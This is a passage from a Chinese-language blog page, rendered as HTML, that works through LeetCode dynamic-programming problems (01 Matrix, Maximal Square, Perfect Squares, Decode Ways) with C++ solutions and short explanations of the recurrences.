grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[i] = grid[<span class="number">0</span>][i] + dp[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>] += grid[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[j] = grid[i][j] + <span class="built_in">min</span>(dp[j], dp[j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>每次只更新同一行也是可以的，因为每次只需要左边的和上一行的，其他的不需要</p></blockquote><h3 id="542-01-矩阵"><a href="#542-01-矩阵" class="headerlink" title="542. 01 矩阵"></a><a href="https://leetcode.cn/problems/01-matrix/">542. 01 矩阵</a></h3><h4 id="未ac代码"><a href="#未ac代码" class="headerlink" title="未ac代码"></a>未ac代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">updateMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mat) &#123;</span><br><span class="line">        <span class="type">int</span> m = mat.<span class="built_in">size</span>(), n = mat[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">ans</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">20000</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(i<span class="number">-1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i][j] = <span class="built_in">min</span>(ans[i<span class="number">-1</span>][j]+<span class="number">1</span>, ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j<span class="number">-1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i][j] = <span class="built_in">min</span>(ans[i][j<span class="number">-1</span>]+<span class="number">1</span>, ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(i+<span class="number">1</span> &lt; m) &#123;</span><br><span class="line">                    ans[i][j] = <span class="built_in">min</span>(ans[i+<span class="number">1</span>][j]+<span class="number">1</span>, ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j+<span class="number">1</span> &lt; n) &#123;</span><br><span class="line">                    ans[i][j] = <span class="built_in">min</span>(ans[i][j+<span class="number">1</span>]+<span class="number">1</span>, ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(i<span class="number">-1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i<span class="number">-1</span>][j] = <span class="built_in">min</span>(ans[i<span class="number">-1</span>][j], <span class="number">1</span> + ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j<span class="number">-1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i][j<span class="number">-1</span>] = <span class="built_in">min</span>(ans[i][j<span class="number">-1</span>], <span class="number">1</span> + ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(i+<span class="number">1</span> &lt; m) &#123;</span><br><span class="line">                    ans[i+<span class="number">1</span>][j] = <span class="built_in">min</span>(ans[i+<span class="number">1</span>][j], <span class="number">1</span> + ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j+<span class="number">1</span> &lt; n) &#123;</span><br><span class="line">                    ans[i][j+<span class="number">1</span>] = <span class="built_in">min</span>(ans[i][j+<span class="number">1</span>], <span class="number">1</span> + ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>这个的想法和答案已经很接近了，但我只从一个方向上进行了更新，应该从四个角开始分别进行更新一次</p></blockquote><h4 id="ac代码"><a href="#ac代码" class="headerlink" title="ac代码"></a>ac代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">updateMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix) &#123;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>(), n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dist</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, INT_MAX / <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i - <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">1</span> &lt; m) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i + <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i - <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j + <span class="number">1</span> &lt; n) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][j + <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">1</span> &lt; m) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i + <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j + <span class="number">1</span> &lt; n) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][j + <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="101"><a href="#101" class="headerlink" title="101"></a>101</h4><ul><li>其实从左上和右下两个方向就可以了</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">updateMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix) &#123;</span><br><span class="line">    <span class="keyword">if</span> (matrix.<span class="built_in">empty</span>()) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    <span class="type">int</span> n = matrix.<span class="built_in">size</span>(), m = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m, INT_MAX - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                dp[i][j] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][j<span class="number">-1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i<span class="number">-1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m - <span class="number">1</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &lt; m - <span class="number">1</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][j+<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &lt; n - <span class="number">1</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i+<span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="221-最大正方形"><a href="#221-最大正方形" class="headerlink" title="221. 最大正方形"></a><a href="https://leetcode.cn/problems/maximal-square/">221. 最大正方形</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(m &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> maxx = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = m<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            dp[i][n<span class="number">-1</span>] = matrix[i][n<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            maxx = <span class="built_in">max</span>(maxx, dp[i][n<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            dp[m<span class="number">-1</span>][i] = matrix[m<span class="number">-1</span>][i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            maxx = <span class="built_in">max</span>(maxx, dp[m<span class="number">-1</span>][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = m<span class="number">-2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = n<span class="number">-2</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j] != <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> x = <span class="built_in">min</span>(dp[i][j+<span class="number">1</span>], <span class="built_in">min</span>(dp[i+<span class="number">1</span>][j], dp[i+<span class="number">1</span>][j+<span class="number">1</span>]));</span><br><span class="line">                    dp[i][j] = <span class="number">1</span> + x + <span class="number">2</span>*<span class="built_in">sqrt</span>(x);</span><br><span class="line">                    maxx = <span class="built_in">max</span>(maxx, dp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从右下角到左上角，dp表示以(i, j)为左上角顶点的最大正方形大小<br>看点(i+1, j) (i, j+1) (i+1, j+1)三个点的最小值，在最小值的基础上增加一圈<br>也就是边长+1，由于dp[i][j]表示的是面积， $ dp[i][j] &#x3D; (sqrt(min)+1)^2 &#x3D; min + 2 \times sqrt(min) + 1 $<br>在计算过程中记录max(dp[i][j])</p></blockquote><h2 id="分割类型题"><a href="#分割类型题" class="headerlink" title="分割类型题"></a>分割类型题</h2><h3 id="279-完全平方数"><a href="#279-完全平方数" class="headerlink" title="279. 完全平方数"></a><a href="https://leetcode.cn/problems/perfect-squares/">279. 完全平方数</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numSquares</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> min = INT_MAX<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; i-j*j &gt;= <span class="number">0</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(dp[i-j*j] &lt; min) &#123;</span><br><span class="line">                    min = dp[i - j*j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = min+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>dp[i]保存数字i的最少平方数之和，假设 $ i $ 由 $ j \times j $ 和 $ i - j \times j $ 相加而得，那么<br>$$ dp[i] &#x3D; min_{ j&#x3D;1 }^{ \sqrt i }(dp[i-j \times j]) + 1 $$</p></blockquote><h3 id="91-解码方法"><a href="#91-解码方法" class="headerlink" title="91. 解码方法"></a><a href="https://leetcode.cn/problems/decode-ways/">91. 解码方法</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numDecodings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        s = <span class="string">&quot;(&quot;</span> + s + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[n<span class="number">-2</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> number = s[i+<span class="number">1</span>]*<span class="number">10</span> + s[i+<span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>*<span class="number">11</span>;</span><br><span class="line">            <span class="type">int</span> number1 = s[i+<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            dp[i] = ((number &gt;= <span class="number">10</span> &amp;&amp; number &lt;= <span class="number">26</span>) ? dp[i+<span class="number">2</span>] : <span class="number">0</span>) + ((number1 &gt;= <span class="number">1</span>  &amp;&amp; number1 &lt;= <span class="number">9</span>) ? dp[i+<span class="number">1</span>] : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>在两个数之间添加隔板，并计算两个隔板之间数字是否合法<br>dp[i]表示在数字i后添加一个隔板后，s[i…n-1]共有几种插入隔板的方式<br>如果s[i+1]在1到9之间，则可以在i+1后加入一个隔板<br>如果s[i+1…i+2]在10到26之间，则可以在i+1后不插入隔板而在i+2后加入隔板<br>考虑到隔一个或两个数插入一个隔板，不需要考虑字符串更长的情况<br>则转移方程为<br>$ dp[i] &#x3D; dp[i+1] + dp[i+2] \quad if \quad 1&lt;&#x3D;s[i+1]&lt;&#x3D;9 \quad and \quad 10&lt;&#x3D;s[i+1…i+2]&lt;&#x3D;26 $<br>$ dp[i] &#x3D; dp[i+2] \quad if \quad not \quad 1&lt;&#x3D;s[i+1]&lt;&#x3D;9 \quad and \quad 10&lt;&#x3D;s[i+1…i+2]&lt;&#x3D;26 $<br>$ dp[i] &#x3D; dp[i+1] \quad if \quad 1&lt;&#x3D;s[i+1]&lt;&#x3D;9 \quad and \quad not \quad 10&lt;&#x3D;s[i+1…i+2]&lt;&#x3D;26 $<br>$ dp[i] &#x3D; 0 \quad if \quad not \quad 1&lt;&#x3D;s[i+1]&lt;&#x3D;9 \quad and \quad not \quad 10&lt;&#x3D;s[i+1…i+2]&lt;&#x3D;26 $<br>在s前后加入括号是为了避免反复写重复的逻辑，否则代码很冗余</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numDecodings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(n &lt; <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> s[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> number = (s[n<span class="number">-2</span>] - <span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + (s[n<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> number1 = (s[n<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        dp[n<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[n<span class="number">-2</span>] = ((number1 &gt;= <span class="number">1</span>  &amp;&amp; number1 &lt;= <span class="number">9</span>) ? dp[n<span class="number">-1</span>] : <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            number = (s[i+<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + (s[i+<span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            number1 = (s[i+<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            dp[i] = ((number &gt;= <span class="number">10</span> &amp;&amp; number &lt;= <span class="number">26</span>) ? dp[i+<span class="number">2</span>] : <span class="number">0</span>) + ((number1 &gt;= <span class="number">1</span>  &amp;&amp; number1 &lt;= <span class="number">9</span>) ? dp[i+<span class="number">1</span>] : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        number = (s[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + (s[<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        number1 = (s[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ((number &gt;= <span class="number">10</span> &amp;&amp; number &lt;= <span class="number">26</span>) ? dp[<span class="number">1</span>] : <span class="number">0</span>) + ((number1 &gt;= <span class="number">1</span>  &amp;&amp; number1 &lt;= <span class="number">9</span>) ? dp[<span class="number">0</span>] : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="139-单词拆分"><a href="#139-单词拆分" class="headerlink" 